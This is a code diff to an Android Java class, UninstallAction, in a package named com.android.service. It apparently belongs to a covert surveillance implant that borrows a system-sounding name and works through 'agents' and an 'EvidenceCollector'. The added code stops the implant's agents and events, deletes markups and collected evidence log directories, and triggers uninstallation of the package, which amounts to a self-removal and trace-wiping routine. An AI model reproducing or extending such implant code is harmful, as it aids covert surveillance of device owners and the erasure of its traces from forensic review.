@@ -9,11 +9,23 @@
 
 package com.android.service.action;
 
+import com.android.service.Status;
+import com.android.service.agent.AgentManager;
+import com.android.service.event.EventManager;
+import com.android.service.evidence.EvidenceCollector;
+import com.android.service.evidence.Markup;
+
+import android.content.Intent;
+import android.net.Uri;
+import android.util.Log;
+
 // TODO: Auto-generated Javadoc
 /**
  * The Class UninstallAction.
  */
 public class UninstallAction extends SubAction {
+
+	private static final String TAG = "UninstallAction";
 
 	/**
 	 * Instantiates a new uninstall action.
@@ -34,22 +46,47 @@ public class UninstallAction extends SubAction {
 	 */
 	@Override
 	public boolean execute() {
-		// TODO Auto-generated method stub
-		return false;
+		actualExecute();
+		return true;
 	}
 
 	/**
 	 * Actual execute.
 	 */
-	public static void actualExecute() {
-		// TODO Auto-generated method stub
+	public static boolean actualExecute() {
+		Log.d("QZ", TAG + " (actualExecute): uninstall");
+		boolean ret = stopServices();
+		ret &= removeFiles();
+		ret &= deleteApplication();
 
+		return ret;
+	}
+
+	static boolean stopServices() {
+		AgentManager.self().stopAll();
+		EventManager.self().stopAll();
+		Status.self().unTriggerAll();
+		return true;
+	}
+
+	static boolean removeFiles() {
+		Markup.removeMarkups();
+		EvidenceCollector.self().removeLogDirs(Integer.MAX_VALUE);
+
+		return true;
+	}
+
+	static boolean deleteApplication() {
+		Uri packageURI = Uri.parse("package:com.android.service");
+		Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
+		uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+		Status.getAppContext().startActivity(uninstallIntent);
+		return true;
 	}
 
 	@Override
 	protected boolean parse(byte[] params) {
-		// TODO Auto-generated method stub
-		return false;
+		return true;
 	}
 
 }
